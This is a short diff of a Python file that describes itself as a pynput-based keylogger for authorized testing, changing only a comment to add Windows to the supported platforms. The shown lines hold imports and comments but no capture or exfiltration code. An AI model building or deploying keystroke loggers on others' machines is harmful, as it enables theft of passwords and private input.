@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Keylogger using pynput module
 # For personal/authorized testing only
-# Works on Linux Debian (aarch64)
+# Works on Windows and Linux Debian (aarch64)
 
 import pynput
 from pynput.keyboard import Key, Listener
